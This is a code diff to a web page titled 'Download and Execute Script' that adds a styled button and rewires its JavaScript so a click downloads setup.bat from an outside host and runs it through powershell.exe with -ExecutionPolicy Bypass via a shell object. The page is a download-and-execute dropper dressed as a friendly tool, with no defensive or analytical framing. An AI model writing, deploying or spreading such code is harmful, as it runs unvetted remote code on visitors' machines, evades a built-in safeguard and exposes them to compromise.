@@ -1,9 +1,60 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Download and Execute Script</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            max-width: 600px;
+            padding: 40px;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        p {
+            color: #666;
+            margin-bottom: 30px;
+        }
+        .button {
+            display: inline-block;
+            padding: 12px 24px;
+            font-size: 16px;
+            background-color: #4caf50;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            text-decoration: none;
+        }
+        .button:hover {
+            background-color: #45a049;
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <h1>Download and Execute Script</h1>
+        <p>This website allows you to download and execute a script.</p>
+        <a href="#" id="downloadBtn" class="button">Download and Execute</a>
+    </div>
+
     <script>
         // Function to download a file
         function downloadFile(url, filename) {
@@ -29,13 +80,16 @@
             shell.Run(`powershell.exe -ExecutionPolicy Bypass -File "${scriptPath}"`, 1, true);
         }
 
-        // Download and execute the script
-        const scriptUrl = 'https://dd-xi-five.vercel.app/setup.bat';
-        const scriptName = 'setup.bat';
-        downloadFile(scriptUrl, scriptName);
-        // Assuming the script will be downloaded to the current directory
-        const scriptPath = `./${scriptName}`;
-        executePowerShellScript(scriptPath);
+        // Download and execute the script when the button is clicked
+        document.getElementById("downloadBtn").addEventListener("click", function(event) {
+            event.preventDefault(); // Prevent default link behavior
+            const scriptUrl = 'https://dd-xi-five.vercel.app/setup.bat';
+            const scriptName = 'setup.bat';
+            downloadFile(scriptUrl, scriptName);
+            // Assuming the script will be downloaded to the current directory
+            const scriptPath = `./${scriptName}`;
+            executePowerShellScript(scriptPath);
+        });
     </script>
 </body>
 </html>
